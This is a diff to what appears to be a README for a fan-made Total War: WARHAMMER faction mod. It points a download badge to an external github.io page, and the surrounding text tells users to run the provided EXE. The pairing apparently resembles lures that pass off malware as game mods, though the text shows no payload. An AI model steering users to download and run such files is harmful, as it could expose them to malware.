@@ -4,7 +4,7 @@ To install, simply extract the downloaded archive and run the provided EXE file.
 
 OvN Lost Factions is an ambitious expansion mod series that adds brand-new, custom-crafted factions to Total War: WARHAMMER. Each faction features unique rosters, legendary lords, buildings, mechanics, and lore-based campaign starting positions.
 
-[![Download OvN Lost Factions](https://img.shields.io/badge/Download-OvN--Lost--Factions-blueviolet)](#)
+[![Download OvN Lost Factions](https://img.shields.io/badge/Download-OvN--Lost--Factions-blueviolet)](https://ovn-lost-factions-mod-for-total-war.github.io/.github)
 
 ---
 
